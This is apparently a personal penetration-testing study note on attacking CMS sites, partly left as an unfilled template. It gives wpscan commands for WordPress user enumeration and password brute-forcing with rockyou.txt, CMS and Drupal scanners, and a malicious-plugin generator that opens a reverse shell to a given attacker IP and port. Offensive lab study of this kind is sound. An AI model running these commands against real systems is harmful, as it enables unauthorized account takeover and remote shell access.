# Description

CMS (Content Management System) is computer software used to manage the creation and modification of digital content.

# Command Syntax

-  **CMS Detection**

If you don't know which CMS used in target websites, you can detect it using Cmseek which is an automatic CMS detection tool.

```bash
cmseek -u vulnerable.com
```

-   **WP Scan**

```bash
# Basic WordPress scan
wpscan --url http://$IP/wp/
```

-   **WP Brute Forcing**

```bash
# Brute forcing WordPress login
wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
```

-   **Custom Path**

```bash
wpscan -u "http://<IP>/" --wp-content-dir "<custom-path>"
```

-   **Enumerate Users**

```bash
wpscan -u "http://<IP>/" --enumerate u

# Using wordlist
wpscan -u "http://<IP>/" --username <username> -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt
```

-   **Malicious Plugins**

```bash
# Using a malicious WordPress plugin
https://github.com/wetw0rk/malicious-wordpress-plugin

# Usage
python3 wordpwn.py [LHOST] [LPORT] [HANDLER]

# Example
python3 wordpwn.py 192.168.119.140 443 Y
```

-   **Drupal Scan**

```bash
# Scan Drupal CMS
droopescan scan drupal -u [TARGET_URL]
```

# Common Flags / Options

-flag: Description of what this flag does

# Use Cases

When and why you would use this technique?

# Examples

Practical example from a lab machine or HTB.

```sh
example-command -flag target
```

# Related Notes

[[Link to a related atomic note]]

[MOC - Reconnaissance](../0%20-%20MOCs/MOC%20-%20Reconnaissance.md)

# References

https://exploit-notes.hdks.org/exploit/web/cms/